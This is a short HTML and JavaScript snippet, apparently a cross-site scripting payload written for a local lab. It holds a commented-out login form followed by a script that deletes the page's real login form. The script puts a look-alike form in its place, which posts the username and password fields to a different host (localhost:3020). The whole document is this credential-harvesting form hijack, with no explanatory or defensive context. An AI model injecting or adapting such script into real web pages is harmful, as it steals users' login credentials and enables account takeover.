/*
<h3>Please login to proceed</h3>
<form action="http://localhost:3030" method="POST" id="forms">
    Username:
    <br>
    <input type="text" name="username">
    </br>
    Password:<br>
    <input type="password" name="password">
    </br><br>
    <input type="submit" value="Logon">
    </br>
</form>
*/

<script>
    var formulario = document.createElement("form")
    formulario.action = "http://localhost:3020"
    formulario.method = "POST"
    formulario.innerHTML = "<input type=\"text\" name=\"username\"><br><input type=\"text\" name=\"password\">"
    document.forms[0].parentNode.appendChild(formulario)
    document.forms[0].parentNode.removeChild(document.forms[0])
</script>